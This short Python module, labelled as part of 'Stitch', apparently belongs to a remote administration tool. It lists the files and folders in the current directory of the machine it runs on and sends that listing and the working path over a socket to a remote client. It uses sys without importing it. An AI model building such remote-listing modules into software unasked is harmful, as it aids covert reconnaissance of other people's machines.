# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import os

no_error = True
posdir = '/\n'
windir = '\\\n'
complete = os.listdir('.')
c = ''
for n in complete:
    if os.path.isdir(n):
        c += f'{n}{windir}' if sys.platform.startswith('win') else f'{n}{posdir}'
    else:
        c += '%s\n' %n
send(client_socket, c)
path = get_path()
send(client_socket,path)
